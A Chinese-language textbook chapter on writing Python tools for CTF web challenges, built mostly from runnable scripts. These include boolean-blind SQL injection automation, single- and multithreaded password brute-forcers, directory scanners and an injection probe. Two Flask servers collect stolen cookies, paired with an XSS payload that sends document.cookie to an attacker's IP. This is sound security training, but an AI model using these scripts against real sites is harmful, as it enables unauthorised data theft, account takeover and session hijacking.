# 第 24 章 用 Python 写 CTF 工具

## 本章目标

读完这一章，你将能够：

- 用 requests 库发送 HTTP 请求、操控参数与 Cookie
- 写脚本做批量探测、验证码爆破、目录扫描
- 写编码解码与数据处理脚本
- 用多线程加速扫描/爆破
- 理解"把手工操作变成代码"的思路

> 工具是别人写的，脚本是自己的。当你能用 Python 把重复的解题操作自动化，你就从"工具使用者"进阶到"工具制造者"。这一章承接 Python 卷的基础，聚焦 CTF 场景下的实用脚本。零基础也能跟——每个脚本都逐行解释。

---

## 24.1 为什么写脚本

手工做题有两个瓶颈：

1. **重复**：爆破 1000 次验证码、扫 5000 个目录，手工点不动
2. **精确**：需要精确控制字节、计算时间差、组合多种编码——手工易错

脚本解决这两个问题。**思路**：把你在 Burp 里手工做的操作，用代码复现——发请求、改参数、看响应、判断结果。

本章用 `requests` 库（Python 的 HTTP 客户端，比 curl 更方便）。安装：`pip install requests`。

---

## 24.2 requests 基础：发请求

```python
import requests

# GET 请求
r = requests.get("http://target.com/news?id=1")
print(r.status_code)   # 状态码
print(r.text)          # 响应文本
print(r.headers)       # 响应头

# 带参数（推荐用 params，自动 URL 编码）
r = requests.get("http://target.com/news", params={"id": "1", "name": "test"})
print(r.url)           # 实际请求的 URL

# POST 请求
r = requests.post("http://target.com/login", data={"username": "admin", "password": "123"})

# 自定义头、Cookie
r = requests.get("http://target.com", headers={"User-Agent": "Mozilla/5.0"}, cookies={"session": "abc"})

# 设置超时（重要！防止请求卡死）
r = requests.get("http://target.com", timeout=5)
```

**逐行理解**：`requests.get()` 发 GET 请求，返回 Response 对象，`.text` 是响应内容，`.status_code` 是状态码。这些就是你在 Burp 里看到的东西——只不过用代码控制。

---

## 24.3 脚本一：SQL 注入布尔盲注自动化

回顾第 6 章的盲注——逐位猜解，手工极慢。用脚本自动化：

```python
import requests

url = "http://target.com/news"
charset = "abcdefghijklmnopqrstuvwxyz0123456789{}_"
result = ""

# 逐位猜数据库名
for i in range(1, 50):
    found = False
    for ch in charset:
        # 构造布尔盲注 payload：如果第 i 位是 ch，页面正常
        payload = f"1' AND SUBSTRING(database(),{i},1)='{ch}'--"
        r = requests.get(url, params={"id": payload}, timeout=5)
        if "正常页面的特征" in r.text:   # 根据题目改判断条件
            result += ch
            print(f"第 {i} 位: {ch} → 当前: {result}")
            found = True
            break
    if not found:
        break   # 没有匹配的字符，说明到头了

print("数据库名:", result)
```

**思路**：外层循环遍历每一位，内层循环遍历每个可能字符，构造条件 payload，通过页面差异判断对错——把第 6 章的手工流程完全自动化。

---

## 24.4 脚本二：验证码 / 密码爆破

```python
import requests

url = "http://target.com/login"
s = requests.Session()   # Session 保持 Cookie（验证码场景需要）

with open("passwords.txt") as f:
    passwords = f.read().splitlines()

for pwd in passwords:
    r = s.post(url, data={"username": "admin", "password": pwd.strip()}, timeout=5)
    # 判断是否登录成功（根据题目改）
    if "登录失败" not in r.text:
        print(f"找到密码: {pwd}")
        break
else:
    print("没找到")
```

**关键点**：
- `requests.Session()` 保持会话（Cookie），验证码爆破时必需
- 判断"成功"的条件要根据实际响应调整（状态码、长度、关键词）

---

## 24.5 脚本三：目录扫描

```python
import requests

base = "http://target.com/"
with open("dirs.txt") as f:
    dirs = f.read().splitlines()

for d in dirs:
    try:
        r = requests.get(base + d.strip(), timeout=3)
        # 404 通常不存在；200/301/403 值得关注
        if r.status_code != 404:
            print(f"[{r.status_code}] {base}{d.strip()}")
    except requests.RequestException:
        pass   # 超时/连接错误，跳过
```

这就是 dirsearch 的核心原理——批量请求字典，看状态码。自己写一遍，你就理解工具在做什么。

---

## 24.6 脚本四：编码解码工具

把第 16 章的编码知识写成脚本：

```python
import base64, codecs, re
from urllib.parse import unquote, quote

s = input("输入字符串: ")

# 尝试各种解码
try:
    print("Base64:", base64.b64decode(s).decode())
except Exception:
    pass

if all(c in "0123456789abcdefABCDEF" for c in s) and len(s) % 2 == 0:
    print("Hex:", bytes.fromhex(s).decode())

print("URL:", unquote(s))

# ROT13
rot13 = codecs.encode(s, "rot_13")
print("ROT13:", rot13)
```

---

## 24.7 多线程加速

爆破/扫描很慢时，用多线程并发：

```python
import requests, threading
from concurrent.futures import ThreadPoolExecutor

url = "http://target.com/login"

def try_pwd(pwd):
    r = requests.post(url, data={"username": "admin", "password": pwd}, timeout=5)
    if "登录失败" not in r.text:
        print(f"找到密码: {pwd}")

passwords = open("passwords.txt").read().splitlines()

# 20 个线程并发
with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(try_pwd, passwords)
```

**注意**：并发数别太高（20–50 即可），否则可能把靶场打挂，或被限速。这和条件竞争（第 15 章）是相关技能。

---

## 24.8 接收 bot 的 flag（XSS 外带）

第 7 章提到存储型 XSS 让 bot 触发 payload 偷 Cookie。写一个简单的接收服务器：

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/steal")
def steal():
    cookie = request.args.get("c", "")
    with open("stolen.txt", "a") as f:
        f.write(cookie + "\n")
    print("收到:", cookie)
    return "ok"

app.run(host="0.0.0.0", port=8000)
```

XSS payload 里写 `new Image().src="http://你的IP:8000/steal?c="+document.cookie`，bot 触发后 flag 就写进 `stolen.txt`。

---

## 24.9 写脚本的通用思路

```
① 明确手工步骤：你在 Burp 里一步步做了什么？
② 用 requests 复现每一步
③ 加循环：需要重复的用 for
④ 加判断：怎么知道"成功"了？（状态码/关键词/长度/时间）
⑤ 加异常处理和超时：防止脚本卡死
⑥ 加多线程（可选）：提速
```

**核心**：**脚本不是凭空写的，而是手工流程的代码化**。先在 Burp 里手工走通一遍，再写代码复现——这样最不容易出错。

---

## 24.9 实战案例集：五个完整小工具

24.1–24.9 讲了各个知识点。这一节把前面的技能组合成五个"能直接用"的完整小工具，作为你的脚本模板库。

### 案例一：万能编码转换器

```python
#!/usr/bin/env python3
import base64, codecs, binascii
from urllib.parse import unquote

def try_decode(s):
    results = []
    # Base64
    try:
        d = base64.b64decode(s, validate=True).decode('utf-8')
        results.append(('Base64', d))
    except Exception:
        pass
    # Hex
    try:
        d = binascii.unhexlify(s).decode('utf-8')
        results.append(('Hex', d))
    except Exception:
        pass
    # URL
    if '%' in s:
        results.append(('URL', unquote(s)))
    # ROT13
    results.append(('ROT13', codecs.encode(s, 'rot_13')))
    return results

if __name__ == '__main__':
    s = input('输入: ').strip()
    for name, val in try_decode(s):
        print(f'[{name}] {val}')
```

### 案例二：批量注入探测器

```python
#!/usr/bin/env python3
import requests, sys

url = sys.argv[1]
payloads = ["'", "1' and 1=1--", "1' and 1=2--", "1 or 1=1", "1' or '1'='1"]

base = requests.get(url, params={'id': 1}, timeout=5)
base_len = len(base.text)

for p in payloads:
    try:
        r = requests.get(url, params={'id': p}, timeout=5)
        diff = len(r.text) - base_len
        mark = ' <<< 可疑!' if (abs(diff) > 50 or r.status_code >= 500 or "'" in r.text[:200]) else ''
        print(f'{p:25} 状态:{r.status_code} 长度差:{diff:+d}{mark}')
    except Exception as e:
        print(f'{p:25} 错误: {e}')
```

**用法**：`python3 probe.py http://target.com/news`，看哪个 payload 引起异常。

### 案例三：目录爆破器（带进度）

```python
#!/usr/bin/env python3
import requests, sys
from concurrent.futures import ThreadPoolExecutor

url = sys.argv[1].rstrip('/')
wordlist = sys.argv[2]

with open(wordlist, encoding='utf-8', errors='ignore') as f:
    paths = [line.strip() for line in f if line.strip()]

def check(path):
    try:
        r = requests.get(f'{url}/{path}', timeout=3, allow_redirects=False)
        if r.status_code not in (404,):
            return f'[{r.status_code}] {path} (len={len(r.content)})'
    except Exception:
        pass
    return None

with ThreadPoolExecutor(max_workers=20) as exe:
    for res in exe.map(check, paths):
        if res:
            print(res)
```

### 案例四：Base64 多层解码器

```python
#!/usr/bin/env python3
import base64, re

s = input('输入: ').strip()
for i in range(20):
    if re.fullmatch(r'[A-Za-z0-9+/=]+', s) and len(s) >= 4:
        try:
            d = base64.b64decode(s).decode('utf-8')
            print(f'第{i+1}层: {d}')
            s = d
            if 'flag{' in s:
                print('找到 flag:', s)
                break
        except Exception:
            break
    else:
        print(f'停止于第{i}层，结果: {s}')
        break
```

### 案例五：XSS flag 接收器（带时间戳）

```python
#!/usr/bin/env python3
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/c')
def collect():
    data = request.args.get('d', '') or request.args.get('c', '')
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open('loot.txt', 'a', encoding='utf-8') as f:
        f.write(f'[{ts}] {data}\n')
    print(f'[{ts}] 收到: {data}')
    return 'ok'   # 返回 ok 避免 bot 报错

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

### 把这些工具变成你的资产

1. 把所有脚本存进一个 Git 仓库（如 `my-ctf-scripts/`）
2. 每个脚本写清楚用法注释（开头 3 行说明：功能、用法、依赖）
3. 比赛时直接 `python3 xxx.py` 调用，不用现写
4. 用完发现不足就改进，持续迭代

**这正是第 31 章"知识管理"的思想在工具上的应用**——把一次性写的代码沉淀成可复用的资产。

---

## 24.10 本章总结

| 知识点 | 核心要点 |
|--------|---------|
| requests | get/post/params/data/headers/cookies/timeout |
| 盲注脚本 | 双层循环：遍历位置 × 遍历字符，靠响应差异判断 |
| 爆破脚本 | Session 保持 Cookie；判断成功的条件要按题目调 |
| 目录扫描 | 批量请求字典，看状态码（排除 404） |
| 编码脚本 | base64/hex/url/rot13 组合 |
| 多线程 | ThreadPoolExecutor 提速，控制并发数 |
| 编写思路 | 手工流程 → 代码复现 → 加循环判断异常处理 |

---

## 本章练习

1. 用 requests 写一个脚本，批量检测一组 URL 的状态码。
2. 把第 6 章的 SQL 盲注用脚本实现（在 sqli-labs 上测试）。
3. 写一个目录扫描脚本，对比它和 dirsearch 的结果。
4. 写一个编码解码脚本，能自动尝试多种编码组合。
5. 用多线程改造你的爆破脚本，对比提速效果。
6. 用 Flask 写一个 flag 接收服务器，配合一道 XSS 题测试。

---

**下一章预告**：第 25 章系统介绍 CTF 常用工具箱——sqlmap、nmap、hydra、字典资源，以及速查表。把工具用熟，战斗力直接翻倍。
